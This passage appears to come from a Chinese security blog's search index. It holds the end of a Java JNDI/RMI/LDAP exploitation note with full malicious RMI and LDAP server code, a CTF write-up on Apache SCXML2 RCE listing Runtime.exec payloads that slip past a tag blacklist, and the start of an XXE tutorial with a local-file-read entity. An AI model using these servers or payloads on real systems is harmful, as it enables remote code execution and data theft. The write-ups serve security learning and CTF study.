e.printStackTrace();            &#125;            serverInstance = null;            log.info(&quot;[RMI Server] stopped.&quot;);        &#125;    &#125;    public boolean waitFor(int i) &#123;        try &#123;            if (this.hadConnection) &#123;                return true;            &#125; else &#123;                log.info(&quot;[RMI Server] Waiting for connection&quot;);                synchronized(this.waitLock) &#123;                    this.waitLock.wait((long)i);                &#125;                return this.hadConnection;            &#125;        &#125; catch (InterruptedException var5) &#123;            return false;        &#125;    &#125;    public void close() &#123;        this.exit = true;        try &#123;            this.ss.close();        &#125; catch (IOException var4) &#123;        &#125;        synchronized(this.waitLock) &#123;            this.waitLock.notify();        &#125;    &#125;    public void run() &#123;        log.info(&quot;[RMI Server] Listening on &#123;&#125;:&#123;&#125;&quot;, &quot;127.0.0.1&quot;, &quot;8899&quot;);        try &#123;            Socket s = null;            try &#123;                while(!this.exit &amp;&amp; (s = this.ss.accept()) != null) &#123;                    try &#123;                        s.setSoTimeout(5000);                        InetSocketAddress remote = (InetSocketAddress)s.getRemoteSocketAddress();                        log.info(&quot;[RMI Server] Have connection from &quot; + remote);                        InputStream is = s.getInputStream();                        InputStream bufIn = (InputStream)(is.markSupported() ? is : new BufferedInputStream(is));                        bufIn.mark(4);                        DataInputStream in = new DataInputStream(bufIn);                        Throwable var6 = null;                        try &#123;                            int magic = in.readInt();                            short version = in.readShort();                            if (magic == 1246907721 &amp;&amp; version == 2) &#123;                                OutputStream sockOut = s.getOutputStream();                                BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);                                DataOutputStream out = new DataOutputStream(bufOut);                                Throwable var12 = null;                                try &#123;                                    byte protocol = in.readByte();                                    switch (protocol) &#123;                                        case 75:                                            out.writeByte(78);                                            if (remote.getHostName() != null) &#123;                                                out.writeUTF(remote.getHostName());                                            &#125; else &#123;                                                out.writeUTF(remote.getAddress().toString());                                            &#125;                                            out.writeInt(remote.getPort());                                            out.flush();                                            in.readUTF();                                            in.readInt();                                        case 76:                                            this.doMessage(s, in, out);                                            bufOut.flush();                                            out.flush();                                            break;                                        case 77:                                        default:                                            log.info(&quot;[RMI Server] Unsupported protocol&quot;);                                            s.close();                                    &#125;                                &#125; catch (Throwable var88) &#123;                                    var12 = var88;                                    throw var88;                                &#125; finally &#123;                                    if (out != null) &#123;                                        if (var12 != null) &#123;                                            try &#123;                                                out.close();                                            &#125; catch (Throwable var87) &#123;                                                var12.addSuppressed(var87);                                            &#125;                                        &#125; else &#123;                                            out.close();                                        &#125;                                    &#125;                                &#125;                            &#125; else &#123;                                s.close();                            &#125;                        &#125; catch (Throwable var90) &#123;                            var6 = var90;                            throw var90;                        &#125; finally &#123;                            if (in != null) &#123;                                if (var6 != null) &#123;                                    try &#123;                                        in.close();                                    &#125; catch (Throwable var86) &#123;                                        var6.addSuppressed(var86);                                    &#125;                                &#125; else &#123;                                    in.close();                                &#125;                            &#125;                        &#125;                    &#125; catch (InterruptedException var92) &#123;                        return;                    &#125; catch (Exception e) &#123;                        e.printStackTrace(System.err);                    &#125; finally &#123;                        log.info(&quot;[RMI Server] Closing connection&quot;);                        s.close();                    &#125;                &#125;                return;            &#125; finally &#123;                if (s != null) &#123;                    s.close();                &#125;                if (this.ss != null) &#123;                    this.ss.close();                &#125;            &#125;        &#125; catch (SocketException var96) &#123;        &#125; catch (Exception e) &#123;            e.printStackTrace(System.err);        &#125;    &#125;    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception &#123;        log.info(&quot;[RMI Server] Reading message...&quot;);        int op = in.read();        switch (op) &#123;            case 80:                this.doCall(s, in, out);                break;            case 81:            case 83:            default:                throw new IOException(&quot;unknown transport op &quot; + op);            case 82:                out.writeByte(83);                break;            case 84:                UID.read(in);        &#125;        s.close();    &#125;    private void doCall(Socket s, DataInputStream in, DataOutputStream out) throws Exception &#123;        ObjectInputStream ois = new ObjectInputStream(in) &#123;            protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException &#123;                if (&quot;[Ljava.rmi.server.ObjID;&quot;.equals(desc.getName())) &#123;                    return ObjID[].class;                &#125; else if (&quot;java.rmi.server.ObjID&quot;.equals(desc.getName())) &#123;                    return ObjID.class;                &#125; else if (&quot;java.rmi.server.UID&quot;.equals(desc.getName())) &#123;                    return UID.class;                &#125; else if (&quot;java.lang.String&quot;.equals(desc.getName())) &#123;                    return String.class;                &#125; else &#123;                    throw new IOException(&quot;Not allowed to read object&quot;);                &#125;            &#125;        &#125;;        ObjID read;        try &#123;            read = ObjID.read(ois);        &#125; catch (IOException e) &#123;            throw new MarshalException(&quot;unable to read objID&quot;, e);        &#125;        if (read.hashCode() == 2) &#123;            handleDGC(ois);        &#125; else if (read.hashCode() == 0) &#123;            if (this.handleRMI(s, ois, out)) &#123;                this.hadConnection = true;                synchronized(this.waitLock) &#123;                    this.waitLock.notifyAll();                    return;                &#125;            &#125;            s.close();        &#125;    &#125;    private boolean handleRMI(Socket s, ObjectInputStream ois, DataOutputStream out) throws Exception &#123;        int method = ois.readInt();        ois.readLong();        if (method != 2) &#123;            return false;        &#125; else &#123;            String object = (String)ois.readObject();            out.writeByte(81);            Object obj;            try (ObjectOutputStream oos = new MarshalOutputStream(out, &quot;evil&quot;)) &#123;                oos.writeByte(1);                (new UID()).write(oos);                String path = &quot;/&quot; + object;                log.info(&quot;[RMI Server] Send payloadData for &quot; + path);                new Object();                obj = PayloadGenerator.getPayload();//替换为序列化数据                oos.writeObject(obj);                oos.flush();                out.flush();                return true;            &#125;        &#125;    &#125;    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ois.readInt();        ois.readLong();    &#125;    static final class MarshalOutputStream extends ObjectOutputStream &#123;        private String sendUrl;        public MarshalOutputStream(OutputStream out, String u) throws IOException &#123;            super(out);            this.sendUrl = u;        &#125;        MarshalOutputStream(OutputStream out) throws IOException &#123;            super(out);        &#125;        protected void annotateClass(Class&lt;?&gt; cl) throws IOException &#123;            if (this.sendUrl != null) &#123;                this.writeObject(this.sendUrl);            &#125; else if (!(cl.getClassLoader() instanceof URLClassLoader)) &#123;                this.writeObject((Object)null);            &#125; else &#123;                URL[] us = ((URLClassLoader)cl.getClassLoader()).getURLs();                String cb = &quot;&quot;;                for(URL u : us) &#123;                    cb = cb + u.toString();                &#125;                this.writeObject(cb);            &#125;        &#125;        protected void annotateProxyClass(Class&lt;?&gt; cl) throws IOException &#123;            this.annotateClass(cl);        &#125;    &#125;&#125;\n\n修改handleRMI处即可替换恶意stub。\ncodebase加载字节码这个只适用于jdk &lt; 8u121，jdk &lt; 7u131，jdk &lt; 6u141\njndi lookup时，会返回一个Reference对象。当jndi client获取到Reference时，会去加载里面的className参数对应的对象，当加载不到的时候，会从urlclassloader加载，加载的地址是factoryLocation参数，这里我们构造一个恶意类的绑定到对应地址，恶意类的构造方法或者初始化方法里面实现一些恶意代码，即可；客户端会对这个恶意类进行加载和创建实例。\nRMIServer：\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.NamingException;import javax.naming.Reference;public class RMIServer &#123;    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;        Registry registry = LocateRegistry.createRegistry(1099);        // factory表示加载的类的url和类名，所以恶意类文件必须以全类名命名        Reference reference = new Reference(&quot;Calc1233&quot;, &quot;Calc&quot;, &quot;http://127.0.0.1:7777/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;Calc123&quot;, referenceWrapper);    &#125;&#125;\n\nJndiClient：\nimport javax.naming.InitialContext;import javax.naming.NamingException;public class JndiClient &#123;    public static void main(String[] args) throws NamingException &#123;        InitialContext initialContext = new InitialContext();        initialContext.lookup(&quot;rmi://127.0.0.1:1099/Calc123&quot;);    &#125;&#125;\n\nLDAPldap是一种目录访问协议。命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而到了LDAP，目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象。\ncodebase加载字节码跟上面RMI的过程一样，也是返回一个带有Reference的对象，里面执行恶意工厂的地址。适用于&lt;8u191\n直接搬其他师傅写好的服务了：\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;/** * LDAP server * * @author threedr3am */public class LdapServer &#123;  private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;  public static void main(String[] args) &#123;    run();  &#125;  public static void run() &#123;    int port = 1099;    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可    String url = &quot;http://localhost/#Calc&quot;;    try &#123;      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);      config.setListenerConfigs(new InMemoryListenerConfig(          &quot;listen&quot;, //$NON-NLS-1$          InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$          port,          ServerSocketFactory.getDefault(),          SocketFactory.getDefault(),          (SSLSocketFactory) SSLSocketFactory.getDefault()));      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);      System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$      ds.startListening();    &#125; catch (Exception e) &#123;      e.printStackTrace();    &#125;  &#125;  private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;    private URL codebase;    /**     *     */    public OperationInterceptor(URL cb) &#123;      this.codebase = cb;    &#125;    /**     * &#123;@inheritDoc&#125;     *     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)     */    @Override    public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;      String base = result.getRequest().getBaseDN();      Entry e = new Entry(base);      try &#123;        sendResult(result, base, e);      &#125; catch (Exception e1) &#123;        e1.printStackTrace();      &#125;    &#125;    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)        throws LDAPException, MalformedURLException &#123;      URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;&quot;));      System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);      e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);      String cbstring = this.codebase.toString();      int refPos = cbstring.indexOf(&#x27;#&#x27;);      if (refPos &gt; 0) &#123;        cbstring = cbstring.substring(0, refPos);      &#125;      e.addAttribute(&quot;javaCodeBase&quot;, cbstring);      e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$      e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());      result.sendSearchEntry(e);      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));    &#125;  &#125;&#125;\n\n返回恶意序列化数据用于绕过&gt;8u191情况，但是在某些高版本jdk也被禁用了，比如11.0.25，17.0.16，具体看VersionHelper12&#x2F;VersionHelper类中有没有类似：\n\n\n前者可用，后者被禁。\n恶意ldap服务器：\npackage LDAP;import com.unboundid.util.Base64;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import tools.PayloadGen;import tools.ReflectTools;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.text.ParseException;public class deserServer &#123;    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;    public static void main (String[] args) &#123;        String url = &quot;http://vps:8000/#ExportObject&quot;;        int port = 1389;        try &#123;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;,                    InetAddress.getByName(&quot;0.0.0.0&quot;),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        /**         * */ public OperationInterceptor ( URL cb ) &#123;            this.codebase = cb;        &#125;        /**         * &#123;@inheritDoc&#125;         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */ @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            try &#123;                sendResult(result, base, e);            &#125;            catch ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);            String cbstring = this.codebase.toString();            int refPos = cbstring.indexOf(&#x27;#&#x27;);            if ( refPos &gt; 0 ) &#123;                cbstring = cbstring.substring(0, refPos);            &#125;            // Payload1: 利用LDAP+Reference Factory  //            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  //            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  //            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());              // Payload2: 返回序列化Gadget            try &#123;                e.addAttribute(&quot;javaSerializedData&quot;, ReflectTools.ser2bytes(PayloadGen.getPayload()));            &#125; catch (ParseException exception) &#123;                exception.printStackTrace();            &#125;            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;\n\n本地工厂绕过原理就是，jndi lookup最终都会从reference里拿到工厂类，然后执行factory.getObjectInstance。而不同的本地工厂，能实现不同的利用。\n当jdk&gt;8u121和&gt;8u191时，远程加载工厂类用不了，但是可以找一个能够利用的本地工厂。一般就是找BeanFactory。\n这里不展开讲了，打法有很多，可以看：\nhttps://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/\nhttps://tttang.com/archive/1405/#toc_0x01-beanfactory\n当然，除了BeanFactory，还有大量的JDBC连接依赖也实现了ObjectFactory接口，能实现JNDI到JDBC的组合拳：\n\n这里也不展开了，有兴趣的可以看看我之前的博客（1diot9.github.io），或者是看看这几道题：\n软件安全赛初赛2025 JDBCParty，NCTF25 H2Revenge，N1CTF junior2024 Derby DerbyPlus。\n在JNDI打JDBC时，有两种方法去加载本地工厂。一种是以 javaSerializedData 字段进行反序列化，可通过反序列化 Reference 对象进行其他姿势利用；另一种在高版本JDK中能绕过 javaSerializedData 字段反序列化限制，正常提供 Reference 对象，可以理解为 JNDIReferencePayload 更加兼容的版本。\n这两种在java-chains里都有提供：\n\n上面那个JNDIResourceRefPayload是专门用于BeanFactory工厂的。\n总结对我自己来说，这里主要学习了JRMP和RMI怎么打Client。\nJRMP主要思想：一个实现了Remote接口的对象，且被RemoteObjectInvocationHandler（ref指向恶意jrmp）代理，由于调用该对象的任意方法都会进入RemoteObjectInvocationHandler#invoke，最终进入StreamRemoteCall#executeCall，从而触发恶意Exception对象反序列化\nRMI主要思想：Registry返回恶意stub，主要是怎么写恶意Registry\nLDAP本地工厂相对熟悉，就不在这里展开。但是对于ldap的具体流程还是有疑惑的，以ldapAttribute这条链为例，c_lookup有多种触发方法，这点在BlackHatAsia2023的 A New Attack Interface In Java Applications也有提到，后面应该会再写一篇笔记学习。\n参考奇安信攻防社区-JAVA JRMP、RMI、JNDI、反序列化漏洞之间的风花雪月\nRMI-攻击方式总结-安全KER - 安全资讯平台\nRMI-JEP290的分析与绕过-安全KER - 安全资讯平台\nJRMP通信攻击过程及利用介绍-先知社区 \n[Ysoserial-JRMPListener&#x2F;JRMPClient学习 | stoocea’s blog](https://stoocea.github.io/post/JRMPListener Client学习.html#JRMPListener-调试) \n","categories":["Java安全"],"tags":["Java安全"]},{"title":"HDCTF2023-BabyJxAx","url":"/2025/11/18/HDCTF2023-BabyJxAx/","content":"[https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/#%E6%80%9D%E8%80%83%E5%85%B6%E4%BB%96payload](https://boogipop.com/2023/04/24/Apache SCXML2 RCE分析&#x2F;#思考其他payload)\nhttps://zer0peach.github.io/2024/03/22/Apache-SCXML2-RCE/\nhttps://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/\n前言主要考察scxml2 rce 挖掘。在原有的payload上，挖掘新的利用。\n原payload深入分析https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/\n这篇文章给出了一种利用方式\nimport org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.io.SCXMLReader;import org.apache.commons.scxml2.model.ModelException;import org.apache.commons.scxml2.model.SCXML;import javax.xml.stream.XMLStreamException;import java.io.IOException;public class SCXMLDemo &#123;    public static void main(String[] args) throws ModelException, XMLStreamException, IOException &#123;        // engine to execute the scxml instance        SCXMLExecutor executor = new SCXMLExecutor();        // parse SCXML URL into SCXML model        SCXML scxml = SCXMLReader.read(&quot;http://127.0.0.1:8000/poc.xml&quot;);        // set state machine (scxml instance) to execute        executor.setStateMachine(scxml);        executor.go();    &#125;&#125;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;&lt;state id=&quot;run&quot;&gt;&lt;onentry&gt;&lt;script&gt;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;open -a calculator&#x27;)&lt;/script&gt;&lt;/onentry&gt;&lt;/state&gt;&lt;/scxml&gt;\n\n我们打断点，进去调试一下。\n先在Runtime.exec处断点：\n\n这些是比较重要的调用栈。\n\n可以看到Script.execute就是表达式执行的点。看前一个调用栈：\n\n是通过action.execute调用的。那么action肯定是一个接口，我们看看其execute方法的实现：\n\nScript也在其中，所以这些类都有可能是目标。我们点进Assign看看：\n\n关键在于有没有Evaluator类执行eval，以及eval的第二个参数是什么。记住这句话。\n现在回去看xml解析的过程，在这里打断点：\n\n前面调用栈最主要的就是通过url获取了xml内容，其他略过。跟进这个readSCML方法，来到：\n\n这里很明显，开始一层层往里面读了。跟进readState：\n\n跟进readOnEntry：\n\n这个readExeutableContext是重点，要准备读取可执行表达式了，跟进：\n\n跟进readScript：\n\n这里就构建好了最终的Script。\n那上一个switch要是进assign呢？看看：\n\n这里setExpr就是设置表达式，readAV和参数中的attrLocalName就告诉你要设置在标签的属性中，readRequiredAV就是这个属性一定要设置。\n再回头看看Assign类：\n\n果然是执行expr。\n所以我们将payload改成：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;state id=&quot;run&quot;&gt;        &lt;onentry&gt;            &lt;assign location=&quot;1&quot; expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;                            &lt;/assign&gt;        &lt;/onentry&gt;    &lt;/state&gt;&lt;/scxml&gt;\n\n尝试后也能执行。\n那么在最后一个switch中，其他方法也是类似。\n那么，倒数第二个switch呢？也就是state标签后，一定要是onentry吗？\n当然不是了，下面的payload也可以：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;state id=&quot;run&quot;&gt;        &lt;invoke&gt;            &lt;content expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/content&gt;        &lt;/invoke&gt;    &lt;/state&gt;&lt;/scxml&gt;\n\n\n\n\n那第一层是否为state呢？当然也可以是别的，这个就不细说了，自己看源码应该能懂。\n但是，上面那个invoke的payload，其最终执行的调用栈和前面的并不一样：\n\n一般走的都是最上面的microStep，但其实下面两个也能走。分别是通过invoke和final标签执行的时候。\n其实firstStep最上面还有一个executeGlobalSrcipt，听名字就知道，是执行最外层的script。\n回readSCXML，也能发现readGlobalScript方法：\n\n解题源码：\npackage com.example.babyjxvx.FlagController;import java.io.IOException;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.ParserConfigurationException;import org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.io.SCXMLReader;import org.apache.commons.scxml2.model.SCXML;import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import org.w3c.dom.Document;import org.xml.sax.SAXException;@Controller/* loaded from: BabyJxVx.jar:BOOT-INF/classes/com/example/babyjxvx/FlagController/Flagcontroller.class */public class Flagcontroller &#123;    private static Boolean check(String fileName) throws IOException, ParserConfigurationException, SAXException &#123;        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();        DocumentBuilder builder = dbf.newDocumentBuilder();        Document doc = builder.parse(fileName);        int node1 = doc.getElementsByTagName(&quot;script&quot;).getLength();        int node2 = doc.getElementsByTagName(&quot;datamodel&quot;).getLength();        int node3 = doc.getElementsByTagName(&quot;invoke&quot;).getLength();        int node4 = doc.getElementsByTagName(&quot;param&quot;).getLength();        int node5 = doc.getElementsByTagName(&quot;parallel&quot;).getLength();        int node6 = doc.getElementsByTagName(&quot;history&quot;).getLength();        int node7 = doc.getElementsByTagName(&quot;transition&quot;).getLength();        int node8 = doc.getElementsByTagName(&quot;state&quot;).getLength();        int node9 = doc.getElementsByTagName(&quot;onentry&quot;).getLength();        int node10 = doc.getElementsByTagName(&quot;if&quot;).getLength();        int node11 = doc.getElementsByTagName(&quot;elseif&quot;).getLength();        if (node1 &gt; 0 || node2 &gt; 0 || node3 &gt; 0 || node4 &gt; 0 || node5 &gt; 0 || node6 &gt; 0 || node7 &gt; 0 || node8 &gt; 0 || node9 &gt; 0 || node10 &gt; 0 || node11 &gt; 0) &#123;            return false;        &#125;        return true;    &#125;    @RequestMapping(&#123;&quot;/&quot;&#125;)    public String index() &#123;        return BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;    &#125;    @RequestMapping(&#123;&quot;/Flag&quot;&#125;)    @ResponseBody    public String Flag(@RequestParam(required = true) String filename) &#123;        SCXMLExecutor executor = new SCXMLExecutor();        try &#123;            if (check(filename).booleanValue()) &#123;                SCXML scxml = SCXMLReader.read(filename);                executor.setStateMachine(scxml);                executor.go();                return &quot;Revenge to me!&quot;;            &#125;            System.out.println(&quot;nonono&quot;);            return &quot;revenge?&quot;;        &#125; catch (Exception var5) &#123;            System.out.println(var5);            return &quot;revenge?&quot;;        &#125;    &#125;&#125;\n\n黑名单有很多，那么第一层只能选择final：\n\n第二层只能onexit：\n\n第三层可选的就比较多了，assign，log，send，cancel都可以，这里以log为例\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;final id=&quot;run&quot;&gt;        &lt;onexit&gt;            &lt;log expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/log&gt;        &lt;/onexit&gt;    &lt;/final&gt;&lt;/scxml&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;final id=&quot;run&quot;&gt;        &lt;onexit&gt;            &lt;send hints=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/send&gt;        &lt;/onexit&gt;    &lt;/final&gt;&lt;/scxml&gt;\n\n为什么是hints，看Action的实现类：\n\n其他也是一样的。\npayload整理&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;final id=&quot;run&quot;&gt;        &lt;onexit&gt;            &lt;send hints=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/send&gt;            &lt;log expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/log&gt;            &lt;assign expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot; location=&quot;1&quot;&gt;            &lt;/assign&gt;            &lt;cancel sendidexpr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/cancel&gt;            &lt;foreach array=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot; item=&quot;1&quot;&gt;            &lt;/foreach&gt;            &lt;if cond=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/if&gt;        &lt;/onexit&gt;    &lt;/final&gt;&lt;/scxml&gt;\n\n最内层的都可以\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;    &lt;script&gt;        &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)    &lt;/script&gt;&lt;/scxml&gt;\n\n\n\n这里又发现一个新问题，finalize的子标签不能为send：\n\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;    &lt;parallel&gt;        &lt;invoke id=&quot;flag&quot; src=&quot;1&quot;&gt;            &lt;param expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot; name=&quot;flag&quot;&gt;            &lt;/param&gt;            &lt;content expr=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;            &lt;/content&gt;        &lt;/invoke&gt;    &lt;/parallel&gt;&lt;/scxml&gt;\n\n其他的就不写了，都差不多。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"XXE整理","url":"/2025/11/18/XXE%E6%95%B4%E7%90%86/","content":"前言一开始学web基础漏洞时，就没好好看过xxe，因为感觉考的少。一天，killer师傅在公众号发了个xxe小挑战（https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA），我就想借此机会学习一下xxe。\nxxe简介初见当xml允许引用外部实体时，可能会造成文件读取或端口探测的效果。所以，可以说xxe相当于任意文件读+SSRF，只不过这里读文件的条件其实比较苛刻。\n来看一个最简单的payload：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[        &lt;!ENTITY read SYSTEM &quot;file:///D:/flag.txt&quot;&gt;        ]&gt;&lt;data&gt;    &lt;a&gt;&amp;read;&lt;/a&gt;&lt;/data&gt;\n\n这个payload能够读取win.ini，并作为通用实体read的值。这样就可以在xml正文里通过&read;的方法进行引用，从而将数据注入xml正文。如果解析后有回显的话，我们就能够读到数据。\n这是漏洞函数：\n    public static void docBuilder(String xml) 